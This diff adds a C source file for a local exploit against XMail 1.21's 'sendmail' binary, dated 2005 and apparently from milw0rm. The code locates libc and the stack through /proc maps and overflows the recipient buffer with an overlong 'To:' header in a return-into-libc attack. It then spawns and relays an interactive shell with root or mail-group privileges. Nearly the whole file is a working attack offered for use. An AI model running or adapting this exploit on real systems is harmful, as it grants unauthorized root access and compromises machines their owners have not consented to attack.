@@ -1,0 +1,251 @@
+/*
+* XMail 1.21 'sendmail' local exploit (ret-into-libc)
+* Yields uid root || gid mail
+* By qaaz [at] centrum [dot] cz, 2005
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/select.h>
+
+
+#define TARGET "/var/MailRoot/bin/sendmail"
+
+#define NM "nm"
+#define GREP "grep"
+#define MKDIR "mkdir"
+#define TMP "/tmp"
+#define MAILROOT TMP"/mr"
+
+#define ID "/usr/bin/id"
+#define SH "/bin/sh"
+
+#define OVERLEN (256+12 + 16)
+/* EmitRecipients() stack */
+/* | locals + padding + PUSHes | RET | Arg1... | */
+/* |<--------- OVERLEN ------->| */
+
+#define MAX(x,y) (((x)>(y)) ? (x) : (y))
+
+char *libc_file = NULL;
+unsigned int libc_base = 0;
+unsigned int stack_base = 0;
+
+unsigned int file_addr = 0;
+unsigned int system_addr = 0;
+
+int pid;
+int pi[2], po[2], pe[2];
+
+void sigchild(int sig)
+{
+if (waitpid(pid, NULL, WNOHANG) == pid) {
+printf("[*] Vuln terminated\n");
+exit(-1);
+}
+}
+
+void killchild()
+{
+if (pid) kill(pid, SIGKILL);
+}
+
+char bad_chars(char *buf, int len)
+{
+int i;
+if (len == 0) len == strlen(buf);
+for (i = 0; i < len; i++) {
+if (!buf[i] || strchr("<> \t,\":;'\r\n", buf[i]))
+return buf[i];
+}
+return 0;
+}
+
+unsigned int get_sym(char *lib, char *sym)
+{
+FILE *f;
+char buf[1024];
+unsigned int val = 0;
+
+sprintf(buf, "%s -D %s | %s -w %s", NM, lib, GREP, sym);
+if (f = popen(buf, "r")) {
+fgets(buf, sizeof(buf), f);
+sscanf(buf, "%08lx %*s %*s", &val);
+pclose(f);
+}
+return val;
+}
+
+unsigned int check_sym(char *lib, char *sym, unsigned int base)
+{
+unsigned int offs = get_sym(lib, sym);
+unsigned int addr = base + offs;
+
+if (!offs) {
+printf("[-] %s: not found?\n", sym);
+return 0;
+}
+if (bad_chars((char *) &addr, 4)) {
+printf("[-] %s: 0x%08x, bad chars\n", sym, addr);
+return 0;
+}
+printf("[+] %s: 0x%08x\n", sym, addr);
+return addr;
+}
+
+void do_maps(int pid)
+{
+FILE *f;
+char buf[1024];
+
+sprintf(buf, "/proc/%d/maps", pid);
+if (!(f = fopen(buf, "r"))) return;
+
+while (fgets(buf, sizeof(buf), f)) {
+unsigned int addr_beg, addr_end;
+char pathname[1024];
+int offset;
+
+pathname[0] = 0;
+sscanf(buf, "%08lx-%08lx %*s %08lx %*s %*s %s",
+&addr_beg, &addr_end, &offset, pathname);
+
+if (offset < 0)
+stack_base = addr_end;
+else if (strstr(pathname, "/libc") && (!libc_base || addr_beg < libc_base))
+libc_base = addr_beg, libc_file = (char *) strdup(pathname);
+}
+fclose(f);
+}
+
+void do_syms()
+{
+if (!(file_addr = check_sym(libc_file, "stdout", libc_base))
+&& !(file_addr = check_sym(libc_file, "stderr", libc_base))
+&& !(file_addr = check_sym(libc_file, "stdin", libc_base))) {
+printf("[-] Can't use std files\n");
+exit(-1);
+}
+
+if (!(system_addr = check_sym(libc_file, "system", libc_base))) {
+printf("[-] Can't use system()\n");
+exit(-1);
+}
+}
+
+void do_shell()
+{
+fd_set fds;
+struct timeval tv;
+int retval, maxfd;
+char buf[1024];
+
+maxfd = MAX(0, MAX(po[0], pe[0])) + 1;
+
+while (1) {
+FD_ZERO(&fds);
+FD_SET(0, &fds);
+FD_SET(po[0], &fds);
+FD_SET(pe[0], &fds);
+tv.tv_sec = 0;
+tv.tv_usec = 100;
+
+if (select(maxfd, &fds, NULL, NULL, &tv) == -1) break;
+
+if (FD_ISSET(0, &fds)) {
+if ((retval = read(0, buf, sizeof(buf))) <= 0) break;
+write(pi[1], buf, retval);
+}
+if (FD_ISSET(po[0], &fds)) {
+if ((retval = read(po[0], buf, sizeof(buf))) <= 0) break;
+write(1, buf, retval);
+}
+if (FD_ISSET(pe[0], &fds)) {
+if ((retval = read(pe[0], buf, sizeof(buf))) <= 0) break;
+write(2, buf, retval);
+}
+}
+}
+
+int main(int argc, char *argv[])
+{
+if (argc > 1 && !strcmp(argv[1], "-sh")) {
+setresuid(geteuid(), geteuid(), geteuid());
+setresgid(getegid(), getegid(), getegid());
+system(ID);
+execl(SH, SH, "-i", NULL);
+perror("execl");
+exit(-1);
+}
+
+if (pipe(pi) || pipe(po) || pipe(pe)) {
+perror("[-] pipe");
+return -1;
+}
+
+if ((pid = fork()) == -1) {
+perror("[-] fork");
+return -1;
+}
+
+if (pid) {
+unsigned int i;
+char buf[10*1024];
+
+atexit(killchild);
+signal(SIGCHLD, sigchild);
+sleep(1);
+
+printf("[*] Reading maps...\n");
+do_maps(pid);
+printf("[%c] libc: 0x%08x\n", libc_base?'+':'-', libc_base);
+if (!libc_base) exit(-1);
+printf("[%c] stack: 0x%08x\n", stack_base?'+':'-', stack_base);
+if (!stack_base) exit(-1);
+
+printf("[*] Getting symbols...\n");
+do_syms();
+
+strcpy(buf, "To: h4h4@");
+for (i = 0; i < OVERLEN-5; i++) // "h4h4@" == 5
+strcat(buf, "A");
+strncat(buf, (char *) &system_addr, 4);
+strncat(buf, (char *) &file_addr, 4);
+i = stack_base - 5000;
+strncat(buf, (char *) &i, 4);
+strcat(buf, "\n");
+
+write(pi[1], buf, strlen(buf));
+sleep(1); do_shell();
+printf("[*] Done\n");
+exit(1);
+}
+else {
+char buf[10*1024];
+char *_env[3] = { NULL, "MAIL_ROOT="MAILROOT, NULL };
+char *_arg[3] = { TARGET, "-t", NULL };
+
+sprintf(buf, "%s -p %s/spool/temp", MKDIR, MAILROOT);
+system(buf);
+
+sprintf(buf, "%10000s -sh", argv[0]);
+_env[0] = (char *) strdup(buf);
+
+printf("[*] Executing vuln...\n");
+
+close(0); dup2(pi[0], 0);
+close(1); dup2(po[1], 1);
+close(2); dup2(pe[1], 2);
+execve(_arg[0], _arg, _env);
+perror("[-] execve");
+return -1;
+}
+
+exit(1);
+}
+
+// milw0rm.com [2005-10-20]
